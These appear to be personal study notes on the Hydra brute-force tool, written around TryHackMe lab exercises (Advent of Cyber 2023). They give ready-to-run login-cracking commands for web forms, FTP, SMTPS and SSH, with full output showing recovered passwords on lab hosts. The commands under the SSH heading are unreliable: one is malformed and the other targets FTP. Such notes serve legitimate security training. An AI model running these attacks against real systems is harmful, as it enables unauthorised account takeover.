
https://www.kali.org/tools/hydra/
https://github.com/vanhauser-thc/thc-hydra

---
(From advent of cyber 2023, day 3)

Before we start, we need to view the page’s HTML code. We can do that by right-clicking on the page and selecting “View Page Source”. You will notice that:

1. The method is `post`
2. The URL is `http://10.10.145.83:8000/login.php`
3. The PIN code value is sent with the name `pin`

![The HTML code related to the PIN code form.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c55803e3eccf061b8beeae6268b9dae1.png)  

In other words, the main login page http://10.10.145.83:8000/pin.php receives the input from the user and sends it to `/login.php` using the name `pin`.

These three pieces of information, `post`, `/login.php`, and `pin`, are necessary to set the arguments for Hydra.

We will use `hydra` to test every possible password that can be put into the system. The command to brute force the above form is:

```sh
hydra -l '' -P 3digits.txt -f -v 10.10.145.83 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
```

The command above will try one password after another in the `3digits.txt` file. It specifies the following:

- `-l ''` indicates that the login name is blank as the security lock only requires a password
- `-P 3digits.txt` specifies the password file to use
- `-f` stops Hydra after finding a working password
- `-v` provides verbose output and is helpful for catching errors
- `10.10.145.83` is the IP address of the target
- `http-post-form` specifies the HTTP method to use
- `"/login.php:pin=^PASS^:Access denied"` has three parts separated by `:`
    - `/login.php` is the page where the PIN code is submitted
    - `pin=^PASS^` will replace `^PASS^` with values from the password list
    - `Access denied` indicates that invalid passwords will lead to a page that contains the text “Access denied”
- `-s 8000` indicates the port number on the target

https:
```sh
┌──(kali㉿kali)-[~]
└─$ hydra -l '' -P 3digits.txt -f -v 10.10.145.83 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-03 18:33:21
[DATA] max 16 tasks per 1 server, overall 16 tasks, 4096 login tries (l:1/p:4096), ~256 tries per task
[DATA] attacking http-post-form://10.10.145.83:8000/login.php:pin=^PASS^:Access denied
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] Page redirected to http[s]://10.10.145.83:8000/error.php
[VERBOSE] Page redirected to http[s]://10.10.145.83:8000/error.php
...
[VERBOSE] Page redirected to http[s]://10.10.145.83:8000/error.php
[VERBOSE] Page redirected to http[s]://10.10.145.83:8000/control.php
[VERBOSE] Page redirected to http[s]://10.10.145.83:8000/error.php
[VERBOSE] Page redirected to http[s]://10.10.145.83:8000/error.php
[8000][http-post-form] host: 10.10.145.83   password: 6F5
[STATUS] attack finished for 10.10.145.83 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-03 18:35:47

```

ftp:
```sh
hydra -l user -P passlist.txt ftp://10.10.x.x
```

funny output since anonymous ftp is active, all passwords are valid :D
```sh
┌──(kali㉿kali)-[~]
└─$ hydra -l ftp -P /usr/share/wordlists/rockyou.txt ftp://10.10.52.174
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-04 01:27:00
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.52.174:21/
[21][ftp] host: 10.10.52.174   login: ftp   password: 123456
[21][ftp] host: 10.10.52.174   login: ftp   password: 12345
...
[21][ftp] host: 10.10.52.174   login: ftp   password: lovely
[21][ftp] host: 10.10.52.174   login: ftp   password: jessica
1 of 1 target successfully completed, 16 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-04 01:27:02
```
-l ftp we are specifying a single username, use-L for a username wordlist

-P Path specifying the full path of wordlist, you can specify a single password by using -p.



ftp://10.10.x.x the protocol and the IP address or the fully qualified domain name (FDQN) of the target.

SMTP:
```sh
hydra -l pittman@clinic.thmredteam.com -P clinic-pass.lst smtps://10.10.52.174:465 -v
```

```sh
┌──(kali㉿kali)-[~]
└─$ hydra -l pittman@clinic.thmredteam.com -P clinic-pass.lst smtps://10.10.52.174:465 -v
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-04 01:48:17
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 42000 login tries (l:1/p:42000), ~2625 tries per task
[DATA] attacking smtps://10.10.52.174:465/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] using SMTP LOGIN AUTH mechanism
...
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[465][smtp] host: 10.10.52.174   login: pittman@clinic.thmredteam.com   password: !multidisciplinary00
[STATUS] attack finished for 10.10.52.174 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-04 01:48:25
```

SSH:
```sh
hydra -L users.lst -ssh://P /path/to/wordlist.txt ssh://10.10.x.x -v

hydra -V -t 50 -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://10.10.183.107
```

HTTP:
Help  for the module: `hydra http-get-form -U`

Syntax: `<url>:<form parameters>[:<optional>[:<optional>]:<condition string>`

hydra -V -t 50 -l admin -P /usr/share/wordlists/fasttrack.txt http-get admin.ironcorp.me -s 11025 

```sh
hydra -l phillips -P clinic.lst -f -v 10.10.56.136 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:Login failed"
```

First is the page on the server to GET or POST to (URL), e.g. "/login".

Second is the POST/GET variables (taken from either the browser, proxy, etc.)
 without the initial '?' character and the usernames and passwords being
 replaced with "^USER^" ("^USER64^" for base64 encodings) and "^PASS^"
 ("^PASS64^" for base64 encodings).

Third are optional parameters (see below)

Last is the string that it checks for an *invalid* login (by default).
 Invalid condition login check can be preceded by "F=", successful condition
 login check must be preceded by "S=".
 This is where most people get it wrong! You have to check the webapp what a
 failed string looks like and put it in this parameter! Add the -d switch to see
 the sent/received data!
 Note that using invalid login condition checks can result in false positives!

The following parameters are optional and are put between the form parameters
  and the condition string; seperate them too with colons:
 2=                  302 page forward return codes identify a successful attempt
 (c|C)=/page/uri     to define a different page to gather initial cookies from
 (g|G)=              skip pre-requests - only use this when no pre-cookies are required
 (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
                 ^USER[64]^ and ^PASS[64]^ can also be put into these headers!
                 Note: 'h' will add the user-defined header at the end
                 regardless it's already being sent by Hydra or not.
                 'H' will replace the value of that header if it exists, by the
                 one supplied by the user, or add the header at the end

Examples:
```sh
 /login.php:user=^USER^&pass=^PASS^:incorrect
 /login.php:user=^USER64^&pass=^PASS64^&colon=colon\:escape:S=result=success
 /login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed
 /:user=^USER&pass=^PASS^:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^:H=User-Agent\: wget
 /exchweb/bin/auth/:F=failedowaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:C=/exchweb":reason=
```

tibs example, the http example with  :// syntax
```sh
hydra -L usernames.txt -P passwords4.txt -f -v http-post-form://10.10.206.140/login.php:"username=^USER^&password=^PASS^":"Please enter the correct credentials"
```